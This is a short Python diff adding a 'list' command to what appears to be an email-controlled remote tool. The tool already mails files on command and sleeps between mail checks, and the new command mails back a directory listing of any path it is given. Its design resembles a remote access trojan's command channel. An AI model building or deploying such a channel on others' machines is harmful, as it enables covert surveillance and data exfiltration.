@@ -68,6 +68,8 @@ def execute_task(command, args, mail):
 		change_sleep_time(args[0])
 	elif command.lower() == 'send':
 		mail.send_attachment(args)
+	elif command.lower() == 'list':
+		list_contents(args[0], mail)
 	else:
 		mail.sent_mail = 1
 		status_code = None
@@ -118,6 +120,21 @@ def decrypt_and_parse_data():
 	print('Data decrypted')
 	return data
 
+def list_contents(path, mail):
+	body = ''
+	with os.scandir(path) as parent:
+		for item in parent:
+			if not item.name.startswith('.'):
+				if item.is_file():
+					body += 'f--' + item.name
+				else:
+					body += 'd--' + item.name
+			body += '\n'
+	status_code = 6
+	mail.create_message_obj(status_code)
+	mail.email_msg.set_content(body)
+	mail.sent_mail = 1
+	mail.send_mail(status_code)
 
 def change_sleep_time(num):
 	''' changes the amount of time system sleeps after checking one mail '''
